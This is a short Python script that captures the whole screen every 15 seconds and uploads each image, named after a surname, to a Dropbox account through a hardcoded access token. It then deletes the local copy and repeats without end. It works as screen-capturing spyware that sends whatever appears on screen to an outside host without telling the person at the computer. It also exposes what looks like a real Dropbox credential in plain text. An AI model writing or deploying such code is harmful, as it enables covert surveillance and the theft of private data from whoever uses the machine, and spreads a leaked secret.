import dropbox
import pyautogui as pag
import  datetime
import os
import time

surname = 'Chefonov'
ACCESS_TOKEN = ('sl.Bvb8-Tj6wBBXOyJv6hp3atDpdc-N4EDjbaU16w-l9owkIg2rtExnFNbvI8yjicjCiP47g-Xr1YudneGVhl2W9mCwqaOTsuGbBg_nk8s2OFCfB_t4PLfKXKBvCyBuh_STpQdIcW-0rccM')
dbx = dropbox.Dropbox(oauth2_access_token=ACCESS_TOKEN)
def take_screenshot():
    now = datetime.datetime.now()
    screenshot_file = f"{surname}_screenshot.png"
    screenshot = pag.screenshot()
    screenshot.save(screenshot_file)
    return screenshot_file

def upload_to_dropbox(file_path: str):

    with open(file_path, 'rb') as f:
        dbx.files_upload(f.read() , f"/{file_path}")

        print("Succeressful upload")

while(True):
    screenshot_file = take_screenshot()
    upload_to_dropbox(screenshot_file)
    os.remove(screenshot_file)
    time.sleep(15)
